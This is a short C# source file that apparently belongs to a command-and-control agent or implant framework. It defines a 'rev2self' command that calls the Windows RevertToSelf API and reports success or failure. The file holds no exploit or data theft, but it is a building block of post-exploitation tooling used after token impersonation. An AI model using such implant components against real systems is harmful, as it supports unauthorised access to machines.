using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
namespace Agent.Commands
{
    public class RevertToSelf : AgentCommand
    {
        public override string Name => "rev2self";

        public override string Execute(AgentTask task)
        {
            if (!Native.Advapi.RevertToSelf())
            {
                return "Failed to rev2self";
            }
            return "Successfully performed rev2self";

        }
    }
}
